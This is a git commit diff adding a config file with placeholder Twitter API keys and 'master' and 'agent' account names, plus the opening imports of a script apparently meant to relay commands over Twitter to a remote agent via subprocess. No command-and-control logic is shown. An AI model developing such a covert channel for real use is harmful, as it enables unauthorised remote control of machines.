dc11b9356b037527b8733e2c59aaa46243b5e3ea
marcus <localhost>
2018-07-11 17:52:49 +0100

    base files and stuff

---
+++ config.py
@@ -0,0 +1,12 @@
+# Get these keys from twitter (you will need to create an app)
+keys = {
+	'consumer_key':'XXXXXXXXXXXX',
+	'consumer_secret':'XXXXXXXXXXXX',
+	'access_token':'XXXXXXXXXXXX',
+	'access_secret':'XXXXXXXXXXXX',
+}
+
+twitter = {
+	'server_username':'XXXXXXXXX', # The username of the server (master) account
+	'agent_username':'XXXXXXXXX', # The username of the agent (slave) account
+}
---
+++ tcnc.py
@@ -0,0 +1,9 @@
+#!/usr/bin/python3
+
+import tweepy, os, base64, _thread
+from ast import literal_eval
+from subprocess import Popen, PIPE
+from termcolor import colored as c
+from tweepy import OAuthHandler
+
+
